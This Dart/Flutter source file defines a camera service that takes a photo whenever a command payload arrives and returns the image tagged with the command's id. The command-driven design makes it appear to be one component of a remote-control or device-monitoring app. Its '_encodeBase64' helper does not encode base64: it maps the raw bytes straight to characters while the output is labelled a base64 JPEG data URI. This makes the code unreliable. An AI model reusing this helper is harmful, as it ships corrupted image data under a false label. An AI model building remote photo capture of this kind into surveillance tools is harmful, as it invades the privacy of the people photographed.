import 'dart:async';
import 'dart:io';

import 'package:camera/camera.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';

import '../../core/utils/logger.dart';
import '../../models/command_result_model.dart';

class CameraService {
  static final CameraService _instance = CameraService._();
  factory CameraService() => _instance;
  CameraService._();

  CameraController? _controller;
  final _dio = Dio();

  Future<bool> checkPermission() async {
    final status = await Permission.camera.status;
    return status.isGranted;
  }

  Future<bool> requestPermission() async {
    final status = await Permission.camera.request();
    return status.isGranted;
  }

  Future<CommandResult> capture(Map<String, dynamic> payload) async {
    final commandId = payload['commandId'] as String? ?? '';
    final cameraType = payload['camera'] as String? ?? 'rear';
    final useFlash = payload['flash'] as bool? ?? false;
    final quality = payload['quality'] as String? ?? 'high';

    try {
      if (!await checkPermission()) {
        final granted = await requestPermission();
        if (!granted) {
          return CommandResult.failure(commandId, 'permission_denied: Camera permission not granted');
        }
      }

      final cameras = await availableCameras();
      if (cameras.isEmpty) {
        return CommandResult.failure(commandId, 'no_camera: No cameras available');
      }

      CameraDescription camera;
      if (cameraType == 'front') {
        camera = cameras.firstWhere(
          (c) => c.lensDirection == CameraLensDirection.front,
          orElse: () => cameras.first,
        );
      } else {
        camera = cameras.firstWhere(
          (c) => c.lensDirection == CameraLensDirection.back,
          orElse: () => cameras.first,
        );
      }

      final preset = quality == 'high'
          ? ResolutionPreset.veryHigh
          : quality == 'medium'
              ? ResolutionPreset.high
              : ResolutionPreset.medium;

      _controller = CameraController(camera, preset);
      await _controller!.initialize();

      if (useFlash) {
        // Flash not directly supported in CameraController takePicture
      }

      final file = await _controller!.takePicture();
      await _controller!.dispose();
      _controller = null;

      // Read file as base64
      final bytes = await File(file.path).readAsBytes();
      final base64Image = 'data:image/jpeg;base64,${_encodeBase64(bytes)}';

      return CommandResult.success({
        'commandId': commandId,
        'image_base64': base64Image,
        'image_size_bytes': bytes.length,
        'camera': cameraType,
        'quality': quality,
      });
    } catch (e) {
      AppLogger.e('CameraService', 'Capture failed', e);
      return CommandResult.failure(commandId, 'capture_failed: ${e.toString()}');
    }
  }

  void dispose() {
    _controller?.dispose();
    _controller = null;
  }

  String _encodeBase64(List<int> bytes) {
    return String.fromCharCodes(bytes.map((b) => b));
  }
}